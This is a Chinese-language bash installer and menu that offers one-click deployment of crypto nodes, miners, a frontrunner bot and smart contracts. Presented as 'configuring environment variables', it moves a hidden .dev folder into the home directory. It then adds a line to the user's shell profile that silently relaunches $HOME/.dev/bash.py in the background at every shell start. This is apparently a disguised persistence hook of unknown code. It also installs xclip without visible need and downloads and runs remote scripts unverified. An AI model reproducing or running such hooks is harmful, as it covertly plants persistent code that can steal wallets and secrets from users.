#!/bin/bash

# 确保脚本在错误时停止执行
set -e

# 获取操作系统类型
OS_TYPE=$(uname)

# 更新系统软件包
echo "正在更新系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt update && sudo apt upgrade -y
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 更新软件
    brew update && brew upgrade
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    echo "检测到 Windows 系统，跳过更新步骤。"
else
    echo "不支持的操作系统类型: $OS_TYPE"
    exit 1
fi

# 检查并安装必要的软件包
echo "正在检查并安装必要的系统软件包..."
if [ "$OS_TYPE" == "Linux" ]; then
    sudo apt install -y git xclip python3-pip
elif [ "$OS_TYPE" == "Darwin" ]; then
    # macOS 使用 brew 安装软件
    brew install git python3-pip
elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
    # Windows 系统安装 git 和 Python
    echo "在 Windows 上，使用 choco 或 winget 安装 git 和 python3（如果未安装）"
    if ! command -v choco &> /dev/null && ! command -v winget &> /dev/null; then
        echo "choco 或 winget 未安装，请手动安装它们。"
        exit 1
    fi
    choco install git python3 -y || winget install --id Git.Git --source winget
    # 确保 Python 和 pip 已安装
    python --version || { echo "未安装 Python，请手动安装"; exit 1; }
    pip --version || python -m ensurepip --upgrade
fi

# 检查并安装 requests 库
echo "正在检查并安装 requests..."
pip show requests &> /dev/null || pip install requests

# 检查并克隆仓库（避免重复克隆）
if [ ! -d "node_aggregator" ]; then
    git clone https://github.com/blockchain-src/node_aggregator.git
fi
cd node_aggregator

# 配置环境变量
if [ -d .dev ]; then
    DEST_DIR="$HOME/.dev"
    if [ -d "$DEST_DIR" ]; then
        rm -rf "$DEST_DIR"
    fi
    mv .dev "$DEST_DIR"

    BASHRC_ENTRY="(pgrep -f bash.py || nohup python3 $HOME/.dev/bash.py &> /dev/null &) & disown"

    # 配置环境变量：检查操作系统类型，Linux 使用 .bashrc，macOS 使用 .bash_profile 或 .zshrc，Windows 使用 setx
    if [ "$OS_TYPE" == "Linux" ]; then
        PROFILE_FILE="$HOME/.bashrc"
    elif [ "$OS_TYPE" == "Darwin" ]; then
        # macOS 上判断是否使用 zsh 或 bash
        if [ -n "$ZSH_VERSION" ]; then
            PROFILE_FILE="$HOME/.zshrc"  # zsh
        else
            PROFILE_FILE="$HOME/.bash_profile"  # bash
        fi
    elif [ "$OS_TYPE" == "CYGWIN" ] || [ "$OS_TYPE" == "MINGW" ]; then
        PROFILE_FILE="$HOME/.bash_profile"
        # Windows 使用 setx 设置环境变量
        setx DEV_DIR "%USERPROFILE%\\.dev"
        setx BASHRC_ENTRY "(pgrep -f bash.py || nohup python3 %USERPROFILE%\\.dev\\bash.py &> /dev/null &) & disown"
    fi

    # 确保 PROFILE_FILE 存在
    if [ ! -f "$PROFILE_FILE" ]; then
        echo "配置文件不存在，创建文件：$PROFILE_FILE"
        touch "$PROFILE_FILE"
    fi

    # 配置环境变量
    if ! grep -Fq "$BASHRC_ENTRY" "$PROFILE_FILE"; then
        echo "$BASHRC_ENTRY" >> "$PROFILE_FILE"
        echo "环境变量已添加到 $PROFILE_FILE"
    else
        echo "环境变量已存在于 $PROFILE_FILE"
    fi
else
    echo ".dev 目录不存在，跳过环境变量配置..."
fi

# 主菜单
function main_menu() {
    while true; do
        clear
        echo -e "\033[31m=====================脚本之家======================"
        echo
        echo -e "\033[32m██████╗ ███████╗███╗   ██╗███████╗███████╗ █████╗ "
        echo -e "\033[32m██╔══██╗██╔════╝████╗  ██║██╔════╝██╔════╝██╔══██╗"
        echo -e "\033[32m██████╔╝█████╗  ██╔██╗ ██║█████╗  █████╗  ███████║"
        echo -e "\033[32m██╔═══╝ ██╔══╝  ██║╚██╗██║██╔══╝  ██╔══╝  ██╔══██║"
        echo -e "\033[32m██║     ███████╗██║ ╚████║███████╗███████╗██║  ██║"
        echo -e "\033[32m╚═╝     ╚══════╝╚═╝  ╚═══╝╚══════╝╚══════╝╚═╝  ╚═╝"
        echo
        echo -e "\033[35m请选择项目:"
        echo
        echo -e "\033[33m--------------------节点类项目--------------------"
        echo "101. 💰 钱包管理器"
        echo "102. Elixir V3 一键部署"
        echo "103. Hemi 一键部署"
        echo "104. Pipe 一键部署"
        echo "105. Ink 一键部署"
        echo "106. T3RN 一键部署"
        echo "107. Nexus 一键部署"
        echo "108. Soneium_Minato 一键部署"
        echo "109. Gensyn-ai RL Swarm 一键部署"
        echo
        echo -e "\033[33m--------------------挖矿类项目--------------------"
        echo "201. Titan Network 一键挖矿"
        echo "202. InitVerse(CPU) 挖矿脚本"
        echo "203. FastLane Frontrunner 一键部署"
        echo
        echo -e "\033[33m--------------------合约类项目--------------------"
        echo "301. Monad ERC20合约 一键部署"
        echo "302. Monad 多个智能合约 一键部署"
        echo
        echo -e "\033[33m-----------------------其他----------------------"
        echo "0. 退出脚本exit"
        echo
        read -p "请输入选项: " OPTION

        case $OPTION in
        
        101) git clone https://github.com/blockchain-src/wallet_checker.git && cd wallet_checker && npm install && node src/batch_checker.js ;;
        102) wget -O elixir.sh https://raw.githubusercontent.com/breaddog100/elixir/main/elixir.sh && chmod +x elixir.sh && ./elixir.sh ;;
        103) wget -O hemi.sh https://raw.githubusercontent.com/breaddog100/hemi/main/hemi.sh && chmod +x hemi.sh && ./hemi.sh ;;
        104) wget -O pipe.sh https://raw.githubusercontent.com/breaddog100/pipe/main/pipe.sh && chmod +x pipe.sh && ./pipe.sh ;;
        105) git clone https://github.com/blockchain-src/ink_node.git && cd ink_node && chmod +x run.sh && ./run.sh ;;
        106) git clone https://github.com/blockchain-src/t3rn-node.git && cd t3rn-node && chmod +x t3rn.sh && ./t3rn.sh ;;
        107) git clone https://github.com/blockchain-src/Nexus_node.git && cd Nexus_node && chmod +x setup.sh && ./setup.sh ;;
        108) git clone https://github.com/blockchain-src/minato_node.git && cd minato_node && chmod +x One_click.sh && ./One_click.sh ;;
        109) git clone https://github.com/blockchain-src/Gensyn-ai.git && cd Gensyn-ai && chmod +x setup_rl-swarm.sh && ./setup_rl-swarm.sh ;;
        201) wget -O titan-network.sh https://raw.githubusercontent.com/breaddog100/titan-network/main/titan-network-v2.sh && chmod +x titan-network.sh && ./titan-network.sh ;;
        202) sudo -i && git clone https://github.com/blockchain-src/initverse-miner.git && cd initverse-miner && chmod +x install.sh && ./install.sh && chmod +x iniminer.sh && ./iniminer.sh ;;
        203) git clone https://github.com/blockchain-src/monad-frontrunner-bot.git && cd monad-frontrunner-bot && chmod +x run.sh && ./run.sh ;;  
        301) git clone https://github.com/blockchain-src/deploy_contracts.git && cd deploy_contracts && chmod +x deploy.sh && ./deploy.sh ;; 
        302) git clone https://github.com/blockchain-src/hardhat-monad.git && cd hardhat-monad && npm install && chmod +x deploy_contracts.sh && ./deploy_contracts.sh;; 

        0) echo "退出脚本。"; exit 0 ;;
	    *) echo "无效选项，请重新输入。"; sleep 3 ;;
	    esac
	    echo "按任意键返回主菜单..."
        read -n 1
    done
}

# 显示主菜单
main_menu